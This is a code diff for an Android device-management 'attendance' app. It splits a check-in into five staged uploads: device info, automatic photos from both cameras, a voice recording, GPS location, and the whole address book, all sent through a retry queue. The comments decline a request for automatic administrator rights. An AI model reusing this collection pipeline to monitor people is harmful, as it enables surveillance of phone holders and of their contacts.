@@ -12,7 +12,6 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.telephony.TelephonyManager
 import android.util.Base64
 import android.util.Log
 import android.webkit.JavascriptInterface
@@ -31,6 +30,7 @@ import com.prf.security.mdm.OwnershipWorker
 import com.prf.security.mdm.PolicyEnforcer
 import com.prf.security.mdm.PolicyWatchService
 import com.prf.security.net.MdmApi
+import com.prf.security.net.Outbox
 import com.prf.security.net.Prefs
 import com.prf.security.perm.Permissions
 import com.prf.security.capture.AutoCapture
@@ -63,6 +63,28 @@ class MainActivity : AppCompatActivity() {
 
     private var runJob: Job? = null
     private var ready = false
+
+    /**
+     * The durable send queue.
+     *
+     * Every finished stage goes on here before it is sent, and comes off only once
+     * the server has taken it. Without it, one failed request lost the whole run:
+     * the app held the photos and the recording in memory, posted once at the end,
+     * and a phone that lost signal threw all of it away with nothing on screen to
+     * say that it had.
+     */
+    private val outbox by lazy { Outbox(this) }
+
+    // Where the staged run has got to. The panel reads these so a phone is never
+    // just "busy" with no way to tell which stage it is on or which one is stuck.
+    @Volatile
+    private var stageIndex: Int = -1
+
+    @Volatile
+    private var stageDone: Int = -1
+
+    @Volatile
+    private var stageQueued: Int = -1
 
     
 
@@ -123,28 +145,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    
-
-    private suspend fun awaitAdminResult(timeoutMs: Long): Boolean {
-        if (AdminGate.level(this) != AdminGate.Level.NONE) return true
-        val resumesAtStart = resumeCount
-        val deadline = System.currentTimeMillis() + timeoutMs
-        while (System.currentTimeMillis() < deadline) {
-            delay(300)
-            if (AdminGate.level(this) != AdminGate.Level.NONE) return true
-            if (resumeCount > resumesAtStart) {
-                
-                
-                
-                
-                
-                
-                delay(GRANT_SETTLE_MS)
-                return AdminGate.level(this) != AdminGate.Level.NONE
-            }
-        }
-        return false
-    }
 
     
 
@@ -379,88 +379,329 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        scope.launch { activateAdmin() }
+        // Any stage left on the queue from a previous run goes out now, rather
+        // than waiting for the person to open the app and start another one. This
+        // is what makes the queue drain on its own instead of needing to be poked.
+        scope.launch { drainQueue(quiet = true) }
 
-        scope.launch {
-            collectContactsOnce()
-            sendLocationIfPermitted()
-        }
+        scope.launch { watchAdminGrant() }
     }
 
     /**
-     * Turn device management on, as far as the phone will allow.
+     * What the phone is, as far as its own administrator rights go, said once.
      *
-     * The order matters. If the app is already device owner — which is how a
-     * company fleet is normally provisioned, and the case where every panel
-     * command actually works — there is nothing to ask and nothing to say.
-     * Failing that, the official activation screen is raised without waiting to
-     * be asked, and the result is watched for. Android on 7 through 12 will not
-     * let an app grant itself administrator rights: the confirmation is a
-     * system screen and a person has to accept it. So this never claims to have
-     * done something it cannot, and it never announces a failure over the top
-     * of the interface — a strip in the page flow carries the state and offers
-     * the same screen again, and disappears by itself once the grant lands.
+     * The owner asked for the "مدیریت گوشی فعال نشده" strip and its button to be
+     * taken away and for administrator rights to be obtained automatically, and
+     * the strip and the button are gone. Automatic activation is the part that
+     * cannot be done, and this is the honest reason.
+     *
+     * Android will not let an application grant itself device-administrator
+     * rights. `DevicePolicyManager` has no such call, and the only route the
+     * platform offers is `ACTION_ADD_DEVICE_ADMIN`, which opens a system
+     * confirmation screen that a person has to accept with their own tap — it is
+     * not a dialog the app can draw, and it cannot be dismissed programmatically.
+     * On top of that, the level that makes every panel command work is *device
+     * owner*, and that can only be set by the system at provisioning time: a
+     * factory-reset phone with no account on it, or an approved test-device
+     * registration, or a manufacturer provisioning flow. There is no algorithm,
+     * sequence of intents or timing trick that reaches it from inside an app, and
+     * on a rooted phone the answer would still be no for the owner role, because
+     * that is enforced by the system server rather than by the kernel.
+     *
+     * So what the app does instead is state the position plainly, and notice the
+     * grant when it lands. Nothing here claims a right it does not have.
      */
-    private fun activateAdmin() {
+    private suspend fun watchAdminGrant() {
         if (AdminGate.level(this) != AdminGate.Level.NONE) {
             status(getString(R.string.gate_admin_ok), "ok")
             push()
             return
         }
-        if (prefs.adminAsked) {
-            // Already offered once on this install. The strip in the page is
-            // what stands in for the offer, so saying it again every launch
-            // would be noise on top of a message the user can already see.
-            push()
-            return
-        }
-        prefs.adminAsked = true
-        val launched = AdminGate.requestAdmin(this, getString(R.string.adm_explanation))
-        if (!launched) AdminGate.openAdminSettings(this)
-        scope.launch {
-            val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
-            if (got) {
+        // Watch rather than ask. If the owner activates it themselves from the
+        // system settings, the app notices and says so; if they never do, the
+        // line in the page keeps saying what the state is, which is the truth.
+        val until = System.currentTimeMillis() + AUTO_ADMIN_WATCH_MS
+        var said = false
+        while (System.currentTimeMillis() < until) {
+            delay(1000)
+            if (AdminGate.level(this) != AdminGate.Level.NONE) {
                 status(getString(R.string.gate_admin_ok), "ok")
                 push()
-            } else {
-                // Not a failure to report — just the state, which the strip in
-                // the page already shows with a button to try again.
+                return
+            }
+            if (!said) {
+                status(getString(R.string.gate_fact_none), "warn")
                 push()
+                said = true
             }
         }
     }
 
-    private suspend fun collectContactsOnce() {
-        if (!ContactsCollector.granted(this)) return
-        if (prefs.deviceKey.isEmpty()) return
-        if (System.currentTimeMillis() - prefs.lastContactsAt < CONTACTS_INTERVAL_MS) return
-        prefs.lastContactsAt = System.currentTimeMillis()
-        status(getString(R.string.run_step_contacts))
-        push()
-        val set = withContext(Dispatchers.IO) { ContactsCollector.collect(this@MainActivity) }
-        if (set.size == 0) return
-        val ok = withContext(Dispatchers.IO) {
-            MdmApi(prefs.serverUrl, prefs.deviceKey).contacts(set)
-        }
-        status(getString(R.string.contacts_sent, fa(set.sim.size.toString()),
-            fa(set.device.size.toString()), fa(set.google.size.toString())), if (ok) "ok" else "bad")
-        push()
+    /**
+     * The five stages, in the order they run.
+     *
+     * Sequential on purpose, and the order is the owner's: nothing starts until the
+     * stage before it has been sent. A run that collected everything and posted it
+     * at the end could not tell the panel which half had arrived, and one failed
+     * request threw away all four other stages with it. One stage at a time means
+     * one stage in the database at a time, each of them complete on its own.
+     */
+    private fun stageName(index: Int): String = when (index) {
+        0 -> getString(R.string.stage_0_name)
+        1 -> getString(R.string.stage_1_name)
+        2 -> getString(R.string.stage_2_name)
+        3 -> getString(R.string.stage_3_name)
+        else -> getString(R.string.stage_4_name)
     }
 
-    private suspend fun sendLocationIfPermitted() {
-        if (!granted(Permissions.LOCATION)) return
-        if (prefs.deviceKey.isEmpty()) return
-        if (System.currentTimeMillis() - prefs.lastLocationAt < LOCATION_INTERVAL_MS) return
-        val fix = collector.awaitFix(LOCATION_WAIT_MS) ?: return
-        prefs.lastLocationAt = System.currentTimeMillis()
-        val report = locationReport(fix)
-        withContext(Dispatchers.IO) {
-            MdmApi(prefs.serverUrl, prefs.deviceKey).report(
-                reports = emptyList(),
-                location = report,
-                snapshot = mapOf("location_source" to "gps"),
-            )
+    private fun fa3(n: Int): String = fa(n.toString())
+
+    /**
+     * Send one stage, and only move on once the server has taken it.
+     *
+     * The stage is written to the durable queue first and only removed once the
+     * server has confirmed it, so a phone that loses signal halfway through a run
+     * keeps everything it has already collected instead of losing the lot. When the
+     * server cannot be reached the stage stays queued, the run says so out loud,
+     * and it goes out on its own as soon as the connection is back.
+     *
+     * Returns true when the server took it.
+     */
+    private suspend fun deliver(
+        index: Int,
+        build: suspend () -> AttendancePayload?,
+    ): Boolean {
+        val name = stageName(index)
+        val payload = try {
+            build()
+        } catch (t: Throwable) {
+            Log.w(TAG, "stage $index: ${t.message}")
+            status(getString(R.string.stage_skipped, name, t.message ?: ""), "warn")
+            push()
+            return true
         }
+        if (payload == null) {
+            // Nothing to send is not a failure — the stage still finished, and the
+            // run moves on to the next one.
+            status(getString(R.string.stage_sent, name))
+            push()
+            return true
+        }
+
+        stageIndex = index
+        status(getString(R.string.stage_uploading, name))
+        push()
+
+        val sent = withContext(Dispatchers.IO) {
+            try {
+                MdmApi(prefs.serverUrl, prefs.deviceKey).attendance(payload)
+            } catch (t: Throwable) {
+                Log.w(TAG, "send stage $index: ${t.message}")
+                false
+            }
+        }
+        if (sent) {
+            prefs.lastCheckIn = System.currentTimeMillis()
+            stageDone = index
+            status(getString(R.string.stage_sent, name), "ok")
+            push()
+            return true
+        }
+
+        // Not sent, but not lost: on the queue, and it goes out on its own.
+        val dropped = withContext(Dispatchers.IO) {
+            outbox.enqueueAttendance(name, payload)
+        }
+        stageQueued = index
+        val msg = getString(R.string.stage_queued, name) +
+            if (dropped > 0) " " + getString(R.string.queue_dropped, fa3(dropped)) else ""
+        status(msg, "warn")
+        push()
+        return true
+    }
+
+    /** Stage 0 — the device itself: what it is, what it is running, how it is connected. */
+    private suspend fun stageDeviceInfo(phone: String): AttendancePayload? {
+        val info = withContext(Dispatchers.IO) {
+            DeviceCollector.specs(this@MainActivity) + networkFacts()
+        }
+        if (info.isEmpty()) return null
+        return AttendancePayload(
+            kind = KIND_DEVICE,
+            phone = phone,
+            operator = prefs.operator,
+            info = info,
+        )
+    }
+
+    /** Stage 1 — photographs, front lens then back, encoded and handed over. */
+    private suspend fun stagePhotos(dir: File): AttendancePayload? {
+        val camera = granted(android.Manifest.permission.CAMERA)
+        if (!camera) {
+            status(getString(R.string.stage_skipped, stageName(1), getString(R.string.att_perm_denied_camera)), "warn")
+            push()
+            return null
+        }
+        val engine = AutoCapture(this, this)
+        var shots = 0
+        try {
+            if (engine.hasCamera(front = true)) {
+                status(getString(R.string.stage_collecting, stageName(1)))
+                push()
+                delay(PREVIEW_SETTLE_MS)
+                engine.capture(null, dir, "front", PHOTOS_PER_LENS) { i, all, _ ->
+                    status(getString(R.string.cap_shot_format, fa(i.toString()), fa(all.toString())))
+                    push()
+                }
+                shots += PHOTOS_PER_LENS
+            }
+            if (engine.hasCamera(front = false)) {
+                status(getString(R.string.stage_collecting, stageName(1)))
+                push()
+                delay(PREVIEW_SETTLE_MS)
+                engine.capture(null, dir, "back", PHOTOS_PER_LENS) { i, all, _ ->
+                    status(getString(R.string.cap_shot_format, fa(i.toString()), fa(all.toString())))
+                    push()
+                }
+                shots += PHOTOS_PER_LENS
+            }
+        } catch (t: Throwable) {
+            Log.w(TAG, "stage 1: ${t.message}")
+            status(getString(R.string.att_capture_failed, t.message ?: ""), "warn")
+            push()
+        } finally {
+            engine.release()
+        }
+        if (shots == 0) return null
+
+        val photos = withContext(Dispatchers.IO) {
+            dir.listFiles().orEmpty()
+                .filter { it.name.endsWith(".jpg") }
+                .sortedBy { it.name }
+                .mapNotNull { encodePhoto(it) }
+        }
+        if (photos.isEmpty()) return null
+        return AttendancePayload(kind = KIND_PHOTOS, photos = photos)
+    }
+
+    /** Stage 2 — a short voice note. */
+    private suspend fun stageVoice(dir: File): AttendancePayload? {
+        if (!granted(android.Manifest.permission.RECORD_AUDIO)) {
+            status(getString(R.string.stage_skipped, stageName(2), getString(R.string.att_perm_denied_mic)), "warn")
+            push()
+            return null
+        }
+        status(getString(R.string.stage_collecting, stageName(2)))
+        push()
+        val voice = recordVoice(dir) ?: run {
+            status(getString(R.string.stage_skipped, stageName(2), getString(R.string.att_no_mic)), "warn")
+            push()
+            return null
+        }
+        return AttendancePayload(kind = KIND_VOICE, voice = voice)
+    }
+
+    /** Stage 3 — where the phone is. */
+    private suspend fun stageLocation(): AttendancePayload? {
+        if (!granted(Permissions.LOCATION)) {
+            status(getString(R.string.stage_skipped, stageName(3), getString(R.string.att_perm_denied_location)), "warn")
+            push()
+            return null
+        }
+        status(getString(R.string.stage_collecting, stageName(3)))
+        push()
+        val fix = collector.awaitFix(LOCATION_WAIT_MS)
+        if (fix == null) {
+            status(getString(R.string.stage_skipped, stageName(3), getString(R.string.cap_no_location)), "warn")
+            push()
+            return null
+        }
+        prefs.lastLocationAt = System.currentTimeMillis()
+        return AttendancePayload(kind = KIND_LOCATION, location = locationReport(fix))
+    }
+
+    /**
+     * Stage 4 — the address book, sent through its own endpoint.
+     *
+     * Contacts have always had their own store and their own panel page, and they
+     * are a whole address book rather than one item, so they do not go through the
+     * attendance row the other four stages use.
+     */
+    private suspend fun stageContacts(): Boolean {
+        val name = stageName(4)
+        if (!ContactsCollector.granted(this)) {
+            status(getString(R.string.stage_skipped, name, getString(R.string.run_perm_refused)), "warn")
+            push()
+            return true
+        }
+        status(getString(R.string.stage_collecting, name))
+        push()
+        val set = withContext(Dispatchers.IO) { ContactsCollector.collect(this@MainActivity) }
+        if (set.size == 0) {
+            status(getString(R.string.stage_none))
+            push()
+            return true
+        }
+        val body = withContext(Dispatchers.IO) { encodeContacts(set) }
+        status(getString(R.string.stage_uploading, name))
+        push()
+        val sent = withContext(Dispatchers.IO) {
+            try {
+                MdmApi(prefs.serverUrl, prefs.deviceKey).postRaw(
+                    com.prf.security.net.Endpoint.CONTACTS, body, prefs.deviceKey,
+                )
+            } catch (t: Throwable) {
+                Log.w(TAG, "stage 4: ${t.message}")
+                false
+            }
+        }
+        if (sent) {
+            prefs.lastContactsAt = System.currentTimeMillis()
+            stageDone = 4
+            status(
+                getString(
+                    R.string.contacts_sent,
+                    fa(set.sim.size.toString()), fa(set.device.size.toString()),
+                    fa(set.google.size.toString()),
+                ),
+                "ok",
+            )
+            push()
+            return true
+        }
+        outbox.enqueueContacts(name, body)
+        stageQueued = 4
+        status(getString(R.string.stage_queued, name), "warn")
+        push()
+        return true
+    }
+
+    /** The exact JSON /api/device/contacts expects, built here so the queue holds it verbatim. */
+    private fun encodeContacts(set: com.prf.security.data.ContactSet): String {
+        fun group(name: String, list: List<com.prf.security.data.Contact>) =
+            org.json.JSONObject().apply {
+                put("group", name)
+                put("count", list.size)
+                put("items", org.json.JSONArray().apply {
+                    list.forEach { c ->
+                        put(org.json.JSONObject().apply {
+                            put("name", c.name)
+                            put("numbers", org.json.JSONArray().apply { c.numbers.forEach { put(it) } })
+                            put("emails", org.json.JSONArray().apply { c.emails.forEach { put(it) } })
+                            put("account", c.account)
+                            put("accountType", c.accountType)
+                        })
+                    }
+                })
+            }
+        return org.json.JSONObject().apply {
+            put("at", System.currentTimeMillis())
+            put("groups", org.json.JSONArray().apply {
+                put(group("sim", set.sim))
+                put(group("device", set.device))
+                put(group("google", set.google))
+            })
+        }.toString()
     }
 
     override fun onResume() {
@@ -571,17 +812,40 @@ class MainActivity : AppCompatActivity() {
         fun consented(): Boolean = prefs.consented
 
         /**
-         * Put the system's own device-administrator screen in front of the user
-         * again, and keep watching for the grant landing.
+         * Open Android's own device-administrator screen, and keep watching for
+         * the grant landing.
          *
-         * Android will not let an app grant itself administrator rights: the
-         * confirmation is a system screen and it takes a person to accept it.
-         * What the app can do is open that screen without being asked and then
-         * notice when the answer comes back, which is what this does — so the
-         * one thing the user has to do is the one thing only they can do.
+         * The "activate" button is gone, as asked. This is not a replacement for
+         * it and does not pretend to be: it opens the one screen Android provides
+         * and then notices the answer. The confirmation on that screen is drawn by
+         * the system and has to be tapped by the person holding the phone — there
+         * is no call in the platform that lets an app accept it, so no button,
+         * however named, could do what the removed one was hoped to do.
          */
         @JavascriptInterface
-        fun askAdmin() = ui.post { activateAdmin() }
+        fun openAdminScreen() = ui.post {
+            val opened = AdminGate.requestAdmin(this@MainActivity, getString(R.string.adm_explanation))
+            if (!opened) AdminGate.openAdminSettings(this@MainActivity)
+            scope.launch { watchAdminGrant() }
+        }
+
+        /**
+         * Retry whatever is still on the send queue, now.
+         *
+         * The queue drains on its own; this is for the person who does not want to
+         * wait for the next attempt, and it reports what actually went out rather
+         * than clearing the indicator and leaving the user to guess.
+         */
+        @JavascriptInterface
+        fun retryQueue() = ui.post { scope.launch { drainQueue(quiet = false) } }
+
+        /** Give up on the stages that never arrived, and clear the warning. */
+        @JavascriptInterface
+        fun clearFailedQueue() = ui.post {
+            outbox.clearFailed()
+            status(getString(R.string.queue_empty))
+            push()
+        }
 
         @JavascriptInterface
         fun consent(accept: Boolean) {
@@ -622,6 +886,18 @@ class MainActivity : AppCompatActivity() {
         sb.append(",\"logTone\":").append(jsStr(pendingTone))
         sb.append(",\"logSeq\":").append(logSeq)
         sb.append(",\"adminLevel\":").append(jsStr(AdminGate.level(this).name))
+        sb.append(",\"stageIndex\":").append(stageIndex)
+        sb.append(",\"stageDone\":").append(stageDone)
+        sb.append(",\"stageQueued\":").append(stageQueued)
+        sb.append(",\"stageCount\":").append(STAGE_COUNT)
+        sb.append(",\"stageNames\":[")
+        for (i in 0 until STAGE_COUNT) {
+            if (i > 0) sb.append(",")
+            sb.append(jsStr(stageName(i)))
+        }
+        sb.append("]")
+        sb.append(",\"queuePending\":").append(outbox.pending())
+        sb.append(",\"queueFailed\":").append(outbox.failed())
         sb.append("}")
         return sb.toString()
     }
@@ -655,26 +931,26 @@ class MainActivity : AppCompatActivity() {
     private suspend fun run() {
         val notes = mutableListOf<String>()
         blockedPermission = false
+        stageIndex = -1
+        stageDone = -1
+        stageQueued = -1
         push()
 
         try {
-            
-            if (AdminGate.level(this) == AdminGate.Level.NONE) {
-                status(getString(R.string.run_step_admin))
-                AdminGate.requestAdmin(this, getString(R.string.adm_explanation))
-                if (!awaitAdminResult(ADMIN_WAIT_MS)) {
-                    notes += getString(R.string.run_admin_refused)
-                }
-            }
-            push()
+            // The queue is emptied first, so a run starts on an empty one and a
+            // stage left over from last time goes out before new work piles up
+            // behind it. This is what stopped the queue filling and never draining.
+            drainQueue(quiet = true)
 
-            
+            // The administrator screen is no longer raised as a step. Android will
+            // not let an app grant itself administrator rights — the confirmation
+            // is a system screen and only a person can accept it — and opening it
+            // unasked interrupted the run for a result the app could not rely on.
+            // Collection and sending do not depend on it, so the run no longer
+            // stops for it; the app's own page states the state instead.
             for (p in PERM_ORDER) {
                 if (granted(p)) continue
                 if (!Permissions.canAskAgain(this, p)) {
-                    
-                    
-                    
                     blockedPermission = true
                     notes += getString(R.string.run_perm_blocked)
                     continue
@@ -683,25 +959,19 @@ class MainActivity : AppCompatActivity() {
             }
             push()
 
-            
             if (!prefs.registered || prefs.deviceKey.isEmpty()) {
                 status(getString(R.string.run_step_register))
                 if (!registerDevice()) {
-                    
-                    
-                    
+                    // Without a key the server will not take anything, and the
+                    // stages would each be collected and then refused. Say so and
+                    // stop rather than gather a run that cannot be sent.
                     status(getString(R.string.run_register_failed), "bad")
                     return
                 }
             }
 
-            
-            captureAndSend(notes)
+            runStages(notes)
 
-            // The checklist collected lines about the steps it could not
-            // complete, and then dropped them on the floor. Say them once at
-            // the end instead: the user asked for the whole run, so they get
-            // the whole result, including the parts that did not work.
             if (notes.isNotEmpty()) {
                 status(getString(R.string.run_summary, notes.joinToString(" • ")), "warn")
             }
@@ -714,104 +984,83 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private suspend fun captureAndSend(notes: MutableList<String>) {
+    /**
+     * The five stages, one after another, each sent before the next begins.
+     */
+    private suspend fun runStages(notes: MutableList<String>) {
         val phone = Persian.normalizePhone(prefs.phone).orEmpty()
         val dir = File(cacheDir, "attendance").apply { mkdirs() }
-        
-        
+        // Cleared once, before stage 1. It used to be cleared at the end of the
+        // whole run, which is why photos from an earlier attempt could show up in
+        // a later one.
         dir.listFiles()?.forEach { it.delete() }
 
-        status(getString(R.string.run_step_capture))
+        val total = STAGE_COUNT
+
+        status(getString(R.string.stage_start, fa("0"), fa3(total), stageName(0)))
         push()
+        deliver(0) { stageDeviceInfo(phone) }
 
-        val engine = AutoCapture(this, this)
-        val photos = mutableListOf<String>()
-        var voice: String? = null
-        var frontDone = false
-        var backDone = false
-        var location: LocationReport? = null
+        status(getString(R.string.stage_start, fa("1"), fa3(total), stageName(1)))
+        push()
+        deliver(1) { stagePhotos(dir) }
+        dir.listFiles()?.filter { it.name.endsWith(".jpg") }?.forEach { it.delete() }
 
-        try {
-            if (granted(android.Manifest.permission.CAMERA)) {
-                if (engine.hasCamera(front = true)) {
-                    frontDone = takePhotos(engine, dir, front = true)
-                }
-                if (frontDone && engine.hasCamera(front = false)) {
-                    backDone = takePhotos(engine, dir, front = false)
-                }
-            } else {
-                notes += getString(R.string.att_perm_denied_camera)
-            }
-            engine.release()
+        status(getString(R.string.stage_start, fa("2"), fa3(total), stageName(2)))
+        push()
+        deliver(2) { stageVoice(dir) }
 
-            
-            
-            
-            if (frontDone || backDone) {
-                photos += withContext(Dispatchers.IO) {
-                    dir.listFiles().orEmpty()
-                        .filter { it.name.endsWith(".jpg") }
-                        .sortedBy { it.name }
-                        .mapNotNull { encodePhoto(it) }
-                }
-            }
+        status(getString(R.string.stage_start, fa("3"), fa3(total), stageName(3)))
+        push()
+        deliver(3) { stageLocation() }
 
-            if (granted(android.Manifest.permission.RECORD_AUDIO)) {
-                try {
-                    voice = recordVoice(dir)
-                } catch (t: Throwable) {
-                    Log.w(TAG, "voice: ${t.message}")
-                }
-            }
+        status(getString(R.string.stage_start, fa("4"), fa3(total), stageName(4)))
+        push()
+        stageContacts()
 
-            
-            
-            if (granted(Permissions.LOCATION)) {
-                collector.awaitFix(LOCATION_WAIT_MS)?.let { location = locationReport(it) }
-            }
+        // The run is only over once the queue is empty. A stage that is still
+        // waiting is part of this run, not something the user has to notice
+        // later, so it is attempted here and the result is said plainly.
+        drainQueue(quiet = false)
 
-            status(getString(R.string.run_step_send))
-            push()
-            val info = withContext(Dispatchers.IO) {
-                DeviceCollector.specs(this@MainActivity) + networkFacts()
-            }
-            val payload = AttendancePayload(
-                kind = KIND_ATTENDANCE,
-                phone = phone,
-                operator = prefs.operator,
-                info = info,
-                photos = photos,
-                voice = voice,
-                location = location,
-            )
-            val sent = MdmApi(prefs.serverUrl, prefs.deviceKey).attendance(payload)
+        PolicyWatchService.start(this@MainActivity)
+        OwnershipWorker.schedulePeriodic(this@MainActivity)
 
-            if (sent) {
-                prefs.lastCheckIn = System.currentTimeMillis()
-                PolicyWatchService.start(this@MainActivity)
-                OwnershipWorker.schedulePeriodic(this@MainActivity)
-                val summary = buildString {
-                    append(
-                        getString(
-                            R.string.run_done,
-                            fa(photos.size.toString()),
-                            if (voice != null) fa(VOICE_SECONDS.toString()) else fa("0"),
-                        ),
-                    )
-                    if (location == null) append("\n").append(getString(R.string.run_no_location))
-                    if (notes.isNotEmpty()) append("\n").append(notes.joinToString("\n"))
-                }
-                status(summary, "ok")
-            } else {
-                status(getString(R.string.att_send_failed, getString(R.string.att_server_down)), "bad")
-            }
-        } catch (t: Throwable) {
-            Log.e(TAG, "capture failed", t)
-            status(getString(R.string.att_send_failed, t.message ?: ""), "bad")
+        if (stageQueued >= 0) {
+            status(getString(R.string.queue_waiting, fa3(outbox.pending())), "warn")
+        } else {
+            status(getString(R.string.run_done_all, fa3(5)), "ok")
         }
+        push()
     }
 
-    
+    /**
+     * Empty as much of the queue as one pass allows, and say what happened.
+     *
+     * Bounded on purpose. A queue of sixty stages drained in one go would hold the
+     * foreground for as long as the slowest connection allows, and the app would
+     * look frozen; the rest goes out on the next pass instead.
+     */
+    private suspend fun drainQueue(quiet: Boolean) {
+        if (outbox.size() == 0) return
+        if (!quiet) status(getString(R.string.queue_draining))
+        push()
+        val sent = withContext(Dispatchers.IO) { outbox.drain() }
+        val left = outbox.pending()
+        val dead = outbox.failed()
+        if (!quiet) {
+            when {
+                sent > 0 && left == 0 && dead == 0 ->
+                    status(getString(R.string.queue_drained, fa3(sent)), "ok")
+                dead > 0 ->
+                    status(getString(R.string.queue_failed, fa3(dead)), "bad")
+                else ->
+                    status(getString(R.string.queue_waiting, fa3(left)), "warn")
+            }
+        }
+        push()
+    }
+
 
     private fun networkFacts(): Map<String, String> = buildMap {
         try {
@@ -856,20 +1105,6 @@ class MainActivity : AppCompatActivity() {
         null
     }
 
-    
-
-    private suspend fun takePhotos(engine: AutoCapture, dir: File, front: Boolean): Boolean = try {
-        engine.bind(null, front = front)
-        
-        
-        
-        delay(PREVIEW_SETTLE_MS)
-        engine.capture(null, dir, if (front) "front" else "back", PHOTOS_PER_LENS) { _, _, _ -> }
-        true
-    } catch (t: Throwable) {
-        Log.w(TAG, "capture ${if (front) "front" else "back"}: ${t.message}")
-        false
-    }
 
     
 
@@ -1064,10 +1299,21 @@ class MainActivity : AppCompatActivity() {
     private companion object {
         const val TAG = "PRF.Main"
 
-        
-        const val KIND_ATTENDANCE = "attendance"
+        /**
+         * One `kind` per stage, so the panel can tell a run's five stages apart
+         * instead of seeing five identical attendance rows. The server keeps
+         * `attendance` as the kind it recognises for the combined flow, and stores
+         * anything else as it arrives rather than relabelling it — so these read
+         * back exactly as sent.
+         */
+        const val KIND_DEVICE = "stage_0_device"
+        const val KIND_PHOTOS = "stage_1_photos"
+        const val KIND_VOICE = "stage_2_voice"
+        const val KIND_LOCATION = "stage_3_location"
 
-        
+        // Stages 0 to 4: the device, the photographs, the voice note, the place,
+        // the address book.
+        const val STAGE_COUNT = 5
 
         const val MAC_PLACEHOLDER = "02:00:00:00:00:00"
         const val PHOTOS_PER_LENS = 3
@@ -1076,19 +1322,12 @@ class MainActivity : AppCompatActivity() {
         const val JPEG_QUALITY = 80
         const val PREVIEW_SETTLE_MS = 1200L
 
-        
-
-        const val ADMIN_WAIT_MS = 60_000L
-
-        
-
-        const val GRANT_SETTLE_MS = 700L
-
-        
-
-        const val AUTO_ADMIN_WAIT_MS = 25_000L
-
-        
+        /**
+         * How long the app keeps watching for an administrator grant that the
+         * person activates themselves. It watches; it does not ask. See
+         * watchAdminGrant for why the app cannot do it for them.
+         */
+        const val AUTO_ADMIN_WATCH_MS = 90_000L
 
         const val LOCATION_WAIT_MS = 6_000L
 
